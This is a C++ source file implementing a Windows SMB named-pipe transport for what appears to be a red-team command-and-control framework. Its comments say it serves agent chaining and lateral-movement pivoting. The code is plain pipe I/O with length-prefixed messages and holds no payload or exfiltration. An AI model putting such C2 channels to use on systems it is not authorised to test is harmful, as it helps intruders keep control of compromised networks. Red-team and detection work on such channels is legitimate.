// SMB Named Pipe Transport - Windows peer-to-peer C2 channel
// Used for agent chaining and lateral movement pivoting
#include "transport.h"

#ifdef RTLC2_WINDOWS

#include <windows.h>
#include <cstring>
#include <vector>

namespace rtlc2 {
namespace transport {

SMBTransport::SMBTransport(const std::string& pipe_name, bool is_server)
    : pipe_name_(pipe_name), is_server_(is_server), pipe_handle_(INVALID_HANDLE_VALUE) {
    // Ensure pipe name has proper prefix
    if (pipe_name_.find("\\\\.\\pipe\\") != 0 && pipe_name_.find("\\\\") != 0) {
        pipe_name_ = "\\\\.\\pipe\\" + pipe_name_;
    }
}

SMBTransport::~SMBTransport() {
    Disconnect();
}

bool SMBTransport::Connect() {
    if (is_server_) return CreateServer();
    return ConnectClient();
}

bool SMBTransport::CreateServer() {
    pipe_handle_ = CreateNamedPipeA(
        pipe_name_.c_str(),
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES,
        65536, 65536, 0, NULL
    );

    if (pipe_handle_ == INVALID_HANDLE_VALUE) return false;

    // Wait for client connection
    if (!ConnectNamedPipe(pipe_handle_, NULL)) {
        if (GetLastError() != ERROR_PIPE_CONNECTED) {
            CloseHandle(pipe_handle_);
            pipe_handle_ = INVALID_HANDLE_VALUE;
            return false;
        }
    }

    connected_ = true;
    return true;
}

bool SMBTransport::ConnectClient() {
    pipe_handle_ = CreateFileA(
        pipe_name_.c_str(),
        GENERIC_READ | GENERIC_WRITE,
        0, NULL, OPEN_EXISTING, 0, NULL
    );

    if (pipe_handle_ == INVALID_HANDLE_VALUE) {
        // Retry with WaitNamedPipe
        if (WaitNamedPipeA(pipe_name_.c_str(), 5000)) {
            pipe_handle_ = CreateFileA(
                pipe_name_.c_str(),
                GENERIC_READ | GENERIC_WRITE,
                0, NULL, OPEN_EXISTING, 0, NULL
            );
        }
    }

    if (pipe_handle_ == INVALID_HANDLE_VALUE) return false;

    // Set to message mode
    DWORD mode = PIPE_READMODE_MESSAGE;
    SetNamedPipeHandleState(pipe_handle_, &mode, NULL, NULL);

    connected_ = true;
    return true;
}

void SMBTransport::Disconnect() {
    if (pipe_handle_ != INVALID_HANDLE_VALUE) {
        if (is_server_) {
            DisconnectNamedPipe(pipe_handle_);
        }
        CloseHandle(pipe_handle_);
        pipe_handle_ = INVALID_HANDLE_VALUE;
    }
    connected_ = false;
}

bool SMBTransport::IsConnected() const {
    return connected_ && pipe_handle_ != INVALID_HANDLE_VALUE;
}

bool SMBTransport::WritePipe(const std::vector<uint8_t>& data) {
    if (pipe_handle_ == INVALID_HANDLE_VALUE) return false;

    // Write 4-byte length prefix + data
    uint32_t len = (uint32_t)data.size();
    DWORD written = 0;

    if (!WriteFile(pipe_handle_, &len, 4, &written, NULL) || written != 4)
        return false;
    if (!WriteFile(pipe_handle_, data.data(), len, &written, NULL) || written != len)
        return false;

    return true;
}

std::vector<uint8_t> SMBTransport::ReadPipe() {
    if (pipe_handle_ == INVALID_HANDLE_VALUE) return {};

    // Read 4-byte length prefix
    uint32_t len = 0;
    DWORD bytesRead = 0;
    if (!ReadFile(pipe_handle_, &len, 4, &bytesRead, NULL) || bytesRead != 4)
        return {};

    if (len > 10 * 1024 * 1024) return {}; // 10MB max

    std::vector<uint8_t> data(len);
    DWORD totalRead = 0;
    while (totalRead < len) {
        DWORD read = 0;
        if (!ReadFile(pipe_handle_, data.data() + totalRead, len - totalRead, &read, NULL))
            return {};
        totalRead += read;
    }

    return data;
}

Response SMBTransport::Send(const std::vector<uint8_t>& data) {
    Response resp = {};
    if (WritePipe(data)) {
        resp.success = true;
        resp.status_code = 200;
    } else {
        resp.success = false;
        resp.error = "Write failed";
        connected_ = false;
    }
    return resp;
}

Response SMBTransport::Receive() {
    Response resp = {};
    resp.body = ReadPipe();
    if (!resp.body.empty()) {
        resp.success = true;
        resp.status_code = 200;
    } else {
        resp.success = false;
        resp.error = "Read failed";
        connected_ = false;
    }
    return resp;
}

} // namespace transport
} // namespace rtlc2

#endif // RTLC2_WINDOWS
